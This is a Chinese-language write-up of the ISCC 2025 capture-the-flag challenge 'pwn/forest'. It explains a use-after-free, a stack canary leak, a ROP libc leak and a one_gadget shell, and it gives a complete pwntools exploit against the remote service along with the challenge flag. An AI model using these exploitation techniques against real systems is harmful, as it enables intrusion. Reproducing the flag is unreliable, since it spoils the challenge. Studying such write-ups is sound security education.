# ISCC 2025 — pwn/forest

> **难度**: 150 分 | **分类**: pwn | **题目描述**: 神秘森林有一扇古老的门，唯有通过魔法卷轴的考验，解开森林精灵的三道谜题，才能更接近终极秘密。

---

## 一、题目环境与文件分析

题目提供一个 64 位 ELF 可执行文件：

```
$ file attachment-56
attachment-56: ELF 64-bit LSB executable, x86-64, dynamically linked,
               interpreter /lib64/ld-linux-x86-64.so.2, not stripped
```

**安全防护一览**:

| 保护机制 | 状态 | 利用意义 |
|----------|------|----------|
| Stack Canary | 已开启 | 必须泄露 canary 才能劫持控制流 |
| NX | 已开启 | 栈上不可执行，需 ROP 或 ret2libc |
| PIE | 未开启 | 二进制地址固定，可直接构造 ROP |
| RELRO | Partial | GOT 表可写，可用于泄露 libc |

---

## 二、程序逻辑逆向

程序结构清晰，分为三道"谜题"：

### 谜题一：`forest_lock_one` — 堆 Use-After-Free

核心伪代码：

```c
ptr = malloc(0x64);         // 分配 100 字节
strcpy(ptr, "magic");       // 写入 "magic"
free(ptr);                  // 释放！指针悬挂

scanf("%d", &v1);           // 读取分配大小
v3 = malloc(v1);            // 新分配
scanf("%s", incantation);   // 写入新块

if (!strncmp(ptr, "magic", 5))   // 对已释放的 ptr 做比较
    key = 2026;                  // 设置全局变量
```

**漏洞本质**：`ptr` 被 `free()` 后并未置空，仍然指向原地址。第二次 `malloc(v1)` 如果大小与第一次相同（100），glibc 会从 tcache/fastbin 中取回同一块内存。此时写入 "magic"，`strncmp` 比较的就是同一块内容，结果相等。

### 谜题二：`forest_lock_two` — 猜数游戏（已绕过）

```c
if (key != 2026) {
    srand(0x7EA);   // 种子固定为 2026
    for (i = 1; i <= 3; ++i) {
        v3 = rand() % 100000;
        scanf("%d", &v1);
        if (v3 != v1) exit(1);
    }
}
```

当 `key == 2026` 时，此函数直接跳过，无需解题。

### 谜题三：`main` 中的溢出 — 栈缓冲区 + Canary 泄露

```c
char buf[24];                       // [rbp-0x20]
unsigned long canary;               // [rbp-0x08]

puts("What do you sacrifice?");
read(0, buf, 0x30);                 // 读 48 字节 → 溢出 24 字节！
printf("%s ... A curious gift indeed.\n", buf);  // %s 会泄露栈数据
read(0, buf, 0x100);                // 再读 256 字节 → 足以构建 ROP
puts("The ghost answers with warmth.");
return 0;                           // ← 此处触发 ROP
```

**栈布局**：

```
高地址 ┌─────────────────────────┐
       │     return address      │  ← ROP 目标
       ├─────────────────────────┤
       │     saved rbp           │  ← 任意填充
       ├─────────────────────────┤
       │     canary (8 bytes)    │  ← 必须泄露
       ├─────────────────────────┤
       │     buf[0..23] (24B)    │  ← 输入区域
低地址 └─────────────────────────┘
```

---

## 三、利用思路

整个攻击分四步完成：

### 第一步：UAF 越过谜题一

输入 `100`（与第一次 malloc 相同的大小）和 `magic`，使 glibc 分配同一块内存，写入相同内容，`strncmp` 通过。

### 第二步：泄露 Canary

发送 25 字节（24 字节填充 + 1 字节覆盖 canary 低字节）。canary 低字节原本是 `0x00`，被覆盖为非零字符后，`printf("%s")` 不会在此处停止，继续输出 canary 剩余 7 字节。

```
发送: 'A'*24 + 'X'
输出: 'A'*24 + 'X' + canary[1..7] + ...
```

从输出中提取 `canary[1..7]`，首位补 `\x00` 即得完整 canary。

### 第三步：ROP 泄露 libc

利用第二次 `read(0, buf, 0x100)` 构建 ROP 链：

```
┌─ pop rdi; ret    (0x401763)
├─ puts@got        (0x404030)
├─ puts@plt        (0x401060)   → puts(puts@got) 泄露 libc 地址
└─ main            (0x4015c6)   → 返回 main，获得第二轮交互
```

泄露后根据 `puts` 偏移计算 libc 基地址。

### 第四步：one_gadget 获取 shell

返回 main 后再次泄露 canary，直接跳转到 one_gadget：

```
┌─ one_gadget (0x4527a + libc_base)  → execve("/bin/sh", ...)
```

远程 `system()` 被 LD_PRELOAD 钩子限制。使用 glibc 2.23 的 one_gadget 直接 execve 绕过。

---

## 四、Exploit 代码

```python
from pwn import *
context.arch = 'amd64'

POP_RDI = 0x401763
PUTS_PLT = 0x401060
PUTS_GOT = 0x404030
MAIN = 0x4015c6

def leak_canary(io):
    io.send(b'A' * 24 + b'X')
    io.recvuntil(b'X')
    return b'\x00' + io.recv(7)

io = remote('39.96.193.120', 10001)
io.recvuntil(b'rune sheet!')
io.sendline(b'100')
io.sendline(b'magic')
io.recvuntil(b'sacrifice?')
canary = leak_canary(io)

# Leak libc
payload = b'A'*24 + canary + b'B'*8
payload += p64(POP_RDI) + p64(PUTS_GOT) + p64(PUTS_PLT) + p64(MAIN)
io.send(payload.ljust(0x100, b'\x00'))
io.recvuntil(b'warmth.\n')
puts_addr = u64(io.recvline().strip().ljust(8, b'\x00'))
base = puts_addr - 0x6f6a0  # glibc 2.23

# one_gadget
io.recvuntil(b'sacrifice?')
canary2 = leak_canary(io)
io.send(b'A'*24 + canary2 + b'B'*8 + p64(base + 0x4527a))
io.recvuntil(b'warmth.\n')
io.sendline(b'cat /flag*')
io.interactive()
```

运行方式：
```bash
# 本地测试
python3 exploit.py

# 打远程
python3 exploit.py remote
```

---

## 五、Gadget 地址表

| 名称 | 地址 | 用途 |
|------|------|------|
| `pop rdi; ret` | `0x401763` | 设置第一个函数参数 |
| `pop rsi; pop r15; ret` | `0x401761` | 备用（未使用） |
| `ret` | `0x40101a` | 栈对齐 |
| `main` | `0x4015c6` | 二次利用入口 |

---

## 六、关键点总结

1. **Use-After-Free**：`free(ptr)` 后 `ptr` 未置空，配合相同大小的二次 `malloc`，可实现对已释放块的任意写入，绕过 `strncmp` 检查。

2. **Canary 泄露**：`read` 允许读 48 字节进入 24 字节缓冲区，覆盖 canary 低字节（原本 `\x00`），使 `printf("%s")` 继续输出 canary 完整值。

3. **两次利用**：第一次 `read` 仅泄露 canary，第二次 `read`（256 字节空间）构建完整 ROP 链。程序流经 `return` 时劫持执行流。

4. **libc 泄露 → one_gadget**：通过 `puts(puts@got)` 泄露 `puts` 在 libc 中的真实地址。远程 `system()` 被 LD_PRELOAD 钩子劫持，仅接受 `"sh"` 或 `"/bin/sh"` 为参数。使用 glibc 2.23 的 one_gadget（`0x4527a`）直接调用 `execve("/bin/sh")` 绕过该限制。

---

## 七、Flag

```
ISCC{9f88d97a-09b8-4e21-ad9f-9948b3a997c2}
```
